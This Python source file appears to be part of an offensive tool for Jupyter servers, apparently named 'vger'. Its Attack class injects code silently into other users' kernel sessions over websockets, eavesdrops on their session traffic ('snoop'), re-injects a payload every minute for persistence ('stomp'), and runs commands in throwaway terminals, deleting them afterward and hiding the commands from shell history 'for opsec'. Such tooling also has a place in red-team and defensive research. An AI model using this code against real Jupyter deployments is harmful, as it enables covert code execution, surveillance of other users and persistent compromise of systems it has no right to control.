import uuid
import asyncio
import json
from urllib.parse import urlparse
from websockets import connect
from vger.connection import Connection, DumbConnection
import re
import time


class Attack:
    def __init__(self, host_or_connection, secret=None):
        if isinstance(host_or_connection, (Connection, DumbConnection)):
            self.connection = host_or_connection
        else:
            self.connection = Connection(host_or_connection, secret)

    async def _recv_all(self, conn, timeout):
        while True:
            try:
                async with asyncio.timeout(timeout):
                    msg = json.loads(await conn.recv())
                    if msg["msg_type"] in ["stream", "execute_reply", "execute_result"]:
                        if msg["msg_type"] in ["stream", "execute_reply"]:
                            text = msg["content"]["text"]
                        elif msg["msg_type"] in ["execute_result"]:
                            text = msg["content"]["data"]
                        self.connection.print_with_rule(
                            f"[bold blue]RESULT> {text}", category="[bold blue]RESULT"
                        )
                    elif msg["msg_type"] in ["execute_input"]:
                        self.connection.print_with_rule(
                            f"[bold red]REQUEST> {msg['content']['code']}",
                            category="[bold red]REQUEST",
                        )
            except:
                break

    async def attack_session(self, session, code, silent=True, print_out=True):
        jpy_sess = self.connection.jpy_sessions[session]
        code_msg_id = str(uuid.uuid1())
        code_msg = {
            "channel": "shell",
            "content": {"silent": silent, "store_history": False, "code": code},
            "header": {"msg_id": code_msg_id, "msg_type": "execute_request"},
            "metadata": {},
            "parent_header": {},
        }

        ws_base_url = urlparse(self.connection.url)._replace(scheme="ws").geturl()
        ws_url = (
            ws_base_url
            + f"api/kernels/{jpy_sess['kernel']['id']}/channels?session_id={jpy_sess['id']}"
        )
        async with connect(
            ws_url, extra_headers=self.connection.headers, close_timeout=5
        ) as conn:
            await self._recv_all(conn, timeout=1)
            if print_out:
                self.connection.print_with_rule(
                    f"[bold red]INJECT> {code_msg['content']['code']}",
                    category="[bold red]CODE INJECTED",
                )
            await conn.send(json.dumps(code_msg))
            return await self._recv_all(conn, timeout=1)

    async def _send_to_terminal(self, ws, code):
        await ws.send(
            json.dumps(["stdin", " " + code + "\n"])
        )  # space for opsec in some terminals

    async def _recv_from_terminal(self, ws):
        while True:
            message = await ws.recv()
            data = json.loads(message)
            if len(data) > 1 and data[0] == "stdout":
                yield f"{data[1]}"

    async def _run_in_terminal(self, terminal, code, timeout=2, stdout=True):
        ws_base_url = urlparse(self.connection.url)._replace(scheme="ws").geturl()
        ws_url = ws_base_url + f"terminals/websocket/{terminal}"
        out = list()
        try:
            async with connect(
                ws_url, extra_headers=self.connection.headers, close_timeout=timeout
            ) as conn:
                await self._send_to_terminal(conn, code)
                if stdout:
                    out = list()
                    async with asyncio.timeout(timeout):
                        with self.connection.con.status("Receiving.."):
                            async for result in self._recv_from_terminal(conn):
                                out.append(result)

        except asyncio.TimeoutError:
            if stdout:
                return out

    async def run_ephemeral_terminal(self, code, timeout=2, stdout=True):
        def strip_ansi_codes(text):
            ansi_escape = re.compile(r"(?:\x1b\[|\x9b)[0-?]*[ -/]*[@-~]")
            return ansi_escape.sub("", text)

        new_term = self.connection.create_terminal()
        result = await self._run_in_terminal(new_term["name"], code, timeout, stdout)
        if stdout:
            result = [strip_ansi_codes(x) for x in result]
            self.connection.print_with_rule("".join(result))
        self.connection.delete_terminal(new_term["name"])

    async def snoop(self, session, timeout=60):
        jpy_sess = self.connection.jpy_sessions[session]
        ws_base_url = urlparse(self.connection.url)._replace(scheme="ws").geturl()
        ws_url = (
            ws_base_url
            + f"api/kernels/{jpy_sess['kernel']['id']}/channels?session_id={jpy_sess['id']}"
        )

        async with connect(
            ws_url, extra_headers=self.connection.headers, close_timeout=timeout
        ) as conn:
            await self._recv_all(conn, timeout)

    def stomp(self, target, payload_str, frequency=60):
        while True:
            try:
                loop = asyncio.get_event_loop()
                loop.run_until_complete(
                    self.attack_session(
                        target, payload_str, silent=True, print_out=False
                    )
                )
                time.sleep(frequency)
            except:
                pass
